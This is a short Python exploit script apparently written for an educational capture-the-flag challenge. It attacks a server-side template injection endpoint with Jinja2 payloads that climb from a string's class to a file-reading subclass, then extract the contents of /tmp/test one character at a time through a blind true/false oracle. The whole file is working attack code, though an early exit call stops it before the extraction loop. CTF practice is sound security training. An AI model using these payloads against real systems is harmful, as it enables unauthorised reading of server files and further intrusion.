import requests


url = 'https://edu-ctf.csie.org:10162/ssti'

def check(payload):
    r = requests.get(url, params={'payload':payload}, verify=False).text
    print(r)
    return '~p0~' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'


check('{% if sys.version[1]=="3"  %}~p0~{% endif %}')
exit(0)

for i in range(0,100):
    for c in s:
        payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}'
        if check(payload):
            password += c
            print(password)
            break
    print(password)
